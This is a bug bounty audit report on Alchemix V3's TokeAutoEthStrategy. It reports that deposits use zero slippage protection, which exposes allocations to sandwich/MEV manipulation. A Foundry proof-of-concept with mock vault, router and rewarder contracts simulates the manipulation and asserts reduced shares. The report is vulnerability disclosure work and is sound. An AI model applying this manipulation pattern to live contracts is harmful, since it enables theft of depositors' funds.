# 58394 sc high mev opportunity because no slippage protection in tokeautoethstrategy

**Submitted on Nov 1st 2025 at 21:49:48 UTC by @OxPhantom for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #58394
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/strategies/mainnet/TokeAutoEth.sol>
* **Impacts:**
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

The `TokeAutoEthStrategy` deposits WETH into the Tokemak AutoETH ERC4626 vault using `router.depositMax(autoEth, address(this), 0)` with a slippage parameter of `0`. This provides no price protection and exposes allocations to sandwich attacks and adverse price execution, where an attacker can manipulate the vault’s exchange rate or surrounding liquidity to force the strategy to mint fewer shares per WETH deposited.

## Vulnerability Details

Inside `_allocate`, the strategy approves WETH to the router and calls `depositMax` with `minShares = 0`:

```solidity
// no slippage protection 
uint256 shares = router.depositMax(autoEth, address(this), 0);
TokenUtils.safeApprove(address(autoEth), address(rewarder), shares);
rewarder.stake(address(this), shares);
```

Implications:

* `minShares = 0` means any outcome is accepted; there is no bound against receiving fewer shares due to transient price movements, manipulation, or off-by-one rounding in the vault.
* An attacker can front-run the allocation by pushing up the vault exchange rate, causing the strategy to mint fewer shares for the same WETH. The attacker can then revert the move (back-run) and capture the difference.
* Because `_allocate` returns `amount` (in WETH) regardless of minted `shares`, the strategy records full principal allocated while potentially receiving diminished shares value, silently crystallising a loss at entry time.

## Impact Details

* Direct asset loss at allocation time: minted `shares` < fair value due to MEV manipulation or adverse execution.
* Accounting mismatch: the strategy returns `amount` as allocated while economic value received may be less, masking instantaneous loss.

## References

<https://github.com/alchemix-finance/v3-poc/blob/a192ab313c81ba3ab621d9ca1ee000110fbdd1e9/src/strategies/mainnet/TokeAutoEth.sol#L59>

## Proof of Concept

## Proof of Concept

You can copy paste this code in a new test file and run `forge test --mt test_MEV_poc -vvv` to run the coded POC.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

import "forge-std/Test.sol";
import {IERC20} from "lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import {VaultV2} from "lib/vault-v2/src/VaultV2.sol";
import {IVaultV2} from "lib/vault-v2/src/interfaces/IVaultV2.sol";
import {AaveV3ARBUSDCStrategy} from "src/strategies/arbitrum/AaveV3ARBUSDCStrategy.sol";
import {AlchemistAllocator} from "src/AlchemistAllocator.sol";
import {ERC20Mock,ERC20} from "lib/openzeppelin-contracts/contracts/mocks/token/ERC20Mock.sol";
import {ERC4626} from "lib/openzeppelin-contracts/contracts/token/ERC20/extensions/ERC4626.sol";
import {IMYTStrategy} from "src/interfaces/IMYTStrategy.sol";
import {AlchemistCurator} from "src/AlchemistCurator.sol";
import {TokeAutoEthStrategy} from "src/strategies/mainnet/TokeAutoEth.sol";

contract MockAavePool  {
    ERC20Mock public immutable usdc;
    ERC20Mock public immutable aToken;
        mapping(address => uint256) public balance; // principal snapshot
    function addBoost(address a, uint256 b) external { 
        balance[a]+= b;
        //pranking rebasing 
        aToken.mint(a, b);
        }
    constructor(ERC20Mock _usdc, ERC20Mock _a) { 
        usdc = _usdc; aToken = _a; 
        }
    function supply(address asset, uint256 amount, address onBehalfOf, uint16) external {
        require(asset == address(usdc));
        // pull underlying and credit principal
        usdc.transferFrom(msg.sender, address(this), amount);
        balance[msg.sender] = amount;
        aToken.mint(msg.sender, amount);
        // write via assembly to map (avoid getter limitation in PoC)
    }
    function withdraw(address asset, uint256 amount, address to) external returns (uint256) {
        require(asset == address(usdc));
        uint256 totalUnderlyingBalance= balance[msg.sender];
        uint256 userBalance= aToken.balanceOf(msg.sender);
        // send exactly requested amount
        usdc.transfer(to, amount);
        // reduce principal first (not strictly needed for PoC semantics)
        balance[msg.sender] = balance[msg.sender] - amount;
        aToken.burn(msg.sender, (amount*userBalance)/totalUnderlyingBalance);
        return amount;
    }
}
contract MockAutoETHVault is ERC4626 {
    constructor(IERC20 _asset) ERC4626(_asset) ERC20("MockAutoETHVault", "MEV"){}
}
contract MockRewarder {

    ERC4626 public immutable autoETH;
    mapping(address => uint256) public balanceOf; // principal snapshot
    error InsufficientBalance();

    constructor(ERC4626 _autoETH) {
        autoETH = _autoETH;
    }

    
    function stake(address account, uint256 amount) external {
        autoETH.transferFrom(msg.sender, address(this), amount);
        balanceOf[account] += amount;
    }

    function withdraw(address account, uint256 amount, bool claim) external {
        uint256 balance = balanceOf[account];
        if (balance < amount) {
            revert InsufficientBalance();
        }
        balanceOf[account] -= amount;
        autoETH.transfer(account, amount);

    }

}

contract MockRouter {
    IERC20 public immutable asset;
    error InsufficientShares();
    constructor(IERC20 _asset) {
        asset = _asset;
    }
    function depositMax(ERC4626 vault, address to, uint256 minSharesOut) external returns (uint256) {
        uint256 amount = asset.balanceOf(msg.sender);
        asset.approve(address(vault), amount);
        asset.transferFrom(msg.sender, address(this), amount);
        uint256 sharesOut = vault.deposit(amount, to);
        if (sharesOut < minSharesOut) {
            revert InsufficientShares();
        }
        return sharesOut;
    }
}

contract TokeAutoETHStrategyTest is Test {
    ERC20Mock asset;
    MockAutoETHVault autoETHVault;
    MockRewarder rewarder;
    MockRouter router;
    VaultV2 vault;
    AlchemistAllocator allocator;
    TokeAutoEthStrategy strat;
    address owner = makeAddr("owner");
    address operator = makeAddr("operator");
    address permit2= makeAddr("permit2");


     function setUp() public {
        vm.warp(1524785992);
        vm.roll(4370000);
        asset = new ERC20Mock();
        autoETHVault = new MockAutoETHVault(asset);
        rewarder = new MockRewarder(autoETHVault);
        router = new MockRouter(asset);
        vault = new VaultV2(owner, address(asset));
        allocator = new AlchemistAllocator(address(vault), owner, operator);
        strat = new TokeAutoEthStrategy(address(vault),  IMYTStrategy.StrategyParams({
            owner: owner,
            name: "AaveV3ARBUSDC",
            protocol: "AaveV3ARBUSDC",
            riskClass: IMYTStrategy.RiskClass.LOW,
            cap: 100_000e18,
            globalCap: 10_000e18,
            estimatedYield: 100e18,
            additionalIncentives: false,
            slippageBPS: 1}),address(autoETHVault),address(router), address(rewarder),  address(asset), address(0), permit2);
        AlchemistCurator curator = new AlchemistCurator(owner, owner);
        vm.startPrank(owner);
        vault.setCurator(address(curator));
        curator.proxy(address(vault), abi.encodeCall(IVaultV2.submit, abi.encodeCall(IVaultV2.setIsAllocator, (address(allocator), true))));
        vm.warp(block.timestamp + vault.timelock(IVaultV2.setIsAllocator.selector));
        vault.setIsAllocator(address(allocator), true);
        // curator.proxy(address(vault), abi.encodeCall(IVaultV2.submit, abi.encodeCall(IVaultV2.addAdapter, (address(strat)))));
        curator.submitSetStrategy(address(strat), address(vault));
        vm.warp(block.timestamp + vault.timelock(IVaultV2.addAdapter.selector));
        curator.setStrategy(address(strat), address(vault));

        curator.submitIncreaseAbsoluteCap(address(strat),1000e6);
        vm.warp(block.timestamp + vault.timelock(IVaultV2.increaseAbsoluteCap.selector));
         curator.increaseAbsoluteCap(address(strat),1000e6);
        curator.submitIncreaseRelativeCap(address(strat),1e18);
        vm.warp(block.timestamp + vault.timelock(IVaultV2.increaseRelativeCap.selector));
        curator.increaseRelativeCap(address(strat),1e18);
        vm.stopPrank();

    }

    function test_MEV_poc() public {
        address user = makeAddr("user");
        deal(address(asset), user, 10e18);
        vm.startPrank(user);    
        asset.approve(address(autoETHVault), 10e18);
        // deposit 100e6 into the vault
        autoETHVault.deposit(10e18, address(this));
        vm.stopPrank();
        uint256 balanceVault= asset.balanceOf(address(autoETHVault));
        uint256 expectedShare = autoETHVault.convertToShares(100e6);
        // We simulate a manipulation
        deal(address(asset), address(autoETHVault), balanceVault*2);
        deal(address(asset), address(this), 10e18);
        asset.approve(address(vault), 100e6);
        // deposit 100e6 into the vault
        vault.deposit(100e6, address(this));
        vm.prank(owner);
        // allocate 100e6 to the strategy
        allocator.allocate(address(strat), 100e6);
        assertLt(rewarder.balanceOf(address(strat)), expectedShare);
    }
}
```
